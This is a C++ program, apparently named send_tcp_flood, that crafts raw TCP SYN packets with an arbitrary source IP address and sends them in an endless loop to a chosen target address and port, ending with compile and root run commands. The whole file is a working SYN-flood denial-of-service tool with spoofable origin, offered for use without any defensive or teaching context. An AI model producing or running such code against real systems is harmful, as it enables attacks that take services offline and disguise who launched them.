#include <iostream>
#include <cstring>
#include <vector>
#include <memory>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

// Pseudo-header needed for TCP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Function to compute checksum
uint16_t checksum(const void *data, size_t len) {
    const uint16_t *buf = static_cast<const uint16_t *>(data);
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *reinterpret_cast<const uint8_t *>(buf);
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~static_cast<uint16_t>(sum);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <source_ip> <dest_ip> <source_port> <dest_port>\n";
        return 1;
    }

    const char *src_ip = argv[1];
    const char *dest_ip = argv[2];
    uint16_t src_port = static_cast<uint16_t>(std::stoi(argv[3]));
    uint16_t dest_port = static_cast<uint16_t>(std::stoi(argv[4]));

    while (true)
    {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            perror("Socket creation failed");
            return 1;
        }

        // Construct IP header
        iphdr iph = {};
        iph.ihl = 5;
        iph.version = 4;
        iph.tos = 0;
        iph.tot_len = sizeof(iph) + sizeof(tcphdr);
        iph.id = htons(54321); // Random ID
        iph.frag_off = 0;
        iph.ttl = 255;
        iph.protocol = IPPROTO_TCP;
        iph.check = 0;
        iph.saddr = inet_addr(src_ip);
        iph.daddr = inet_addr(dest_ip);

        // Construct TCP header
        tcphdr tcph = {};
        tcph.source = htons(src_port);
        tcph.dest = htons(dest_port);
        tcph.seq = 0;
        tcph.ack_seq = 0;
        tcph.doff = 5; // TCP header size
        tcph.fin = 0;
        tcph.syn = 1;
        tcph.rst = 0;
        tcph.psh = 0;
        tcph.ack = 0;
        tcph.urg = 0;
        tcph.window = htons(5840); // Window size
        tcph.check = 0;
        tcph.urg_ptr = 0;

        // Create pseudo-header
        pseudo_header psh = {};
        psh.source_address = iph.saddr;
        psh.dest_address = iph.daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(tcph));

        // Calculate TCP checksum
        std::vector<uint8_t> pseudogram(sizeof(pseudo_header) + sizeof(tcph));
        std::memcpy(pseudogram.data(), &psh, sizeof(pseudo_header));
        std::memcpy(pseudogram.data() + sizeof(pseudo_header), &tcph, sizeof(tcph));
        tcph.check = checksum(pseudogram.data(), pseudogram.size());

        // Final TCP packet
        std::vector<uint8_t> packet(sizeof(iphdr) + sizeof(tcph));
        std::memcpy(packet.data(), &iph, sizeof(iphdr));
        std::memcpy(packet.data() + sizeof(iphdr), &tcph, sizeof(tcph));

        // Send the packet
        sockaddr_in dest = {};
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = iph.daddr;

        if (sendto(sock, packet.data(), packet.size(), 0, reinterpret_cast<sockaddr*>(&dest), sizeof(dest)) < 0) {
            perror("Send failed");
            return 1;
        }

        std::cout << "Packet sent successfully\n";

        close(sock);
    }

    return 0;
}
// g++ -std=c++17 -o send_tcp_flood send_tcp_flood.cpp
// sudo ./send_tcp_flood <source_ip> <dest_ip> <source_port> <dest_port>
